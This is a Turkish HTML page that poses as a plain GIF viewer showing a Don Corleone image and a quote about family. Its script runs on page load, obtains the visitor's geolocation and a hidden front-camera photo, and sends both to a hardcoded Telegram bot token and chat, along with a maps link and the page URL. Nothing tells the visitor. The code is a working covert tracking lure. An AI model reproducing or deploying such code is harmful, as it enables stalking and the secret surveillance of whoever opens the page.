<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF G√∂sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
        }

        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="Don Carlone.gif" alt="GIF">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
    </div>

    <script>
        const BOT_TOKEN = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const CHAT_ID = '-4991699158';

        async function sendToTelegram(message, photo) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (photo) {
                    const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
                    const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
                    const blob = new Blob([bytes], { type: 'image/jpeg' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'üì∏ Kamera fotoƒürafƒ±');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error('Hata:', error);
            }
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    }),
                    reject,
                    { timeout: 10000 }
                );
            });
        }

        async function takePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.play();
            
            return new Promise(resolve => {
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        stream.getTracks().forEach(t => t.stop());
                        resolve(canvas.toDataURL('image/jpeg', 0.7));
                    }, 500);
                };
            });
        }

        async function requestData() {
            let location = null;
            let photo = null;

            try {
                location = await getLocation();
            } catch (e) {
                console.log('Konum alƒ±namadƒ±');
            }

            try {
                photo = await takePhoto();
            } catch (e) {
                console.log('Fotoƒüraf alƒ±namadƒ±');
            }

            let message = 'üîî <b>Yeni Ziyaret√ßi</b>\n\n';
            message += `‚è∞ ${new Date().toLocaleString('tr-TR')}\n`;
            message += `üåê ${window.location.href}\n\n`;

            if (location) {
                message += `üìç <b>Konum:</b>\n`;
                message += `Enlem: ${location.lat}\n`;
                message += `Boylam: ${location.lng}\n`;
                message += `Doƒüruluk: ${Math.round(location.acc)}m\n\n`;
                message += `üó∫Ô∏è <a href="https://www.google.com/maps?q=${location.lat},${location.lng}">Haritada G√∂r</a>\n\n`;
            } else {
                message += `‚ùå Konum alƒ±namadƒ±\n\n`;
            }

            message += photo ? `üì∏ Fotoƒüraf √ßekildi\n` : `‚ùå Fotoƒüraf alƒ±namadƒ±\n`;

            await sendToTelegram(message, photo);
        }

        window.addEventListener('load', () => {
            setTimeout(requestData, 1000);
        });
    </script>
</body>
</html>
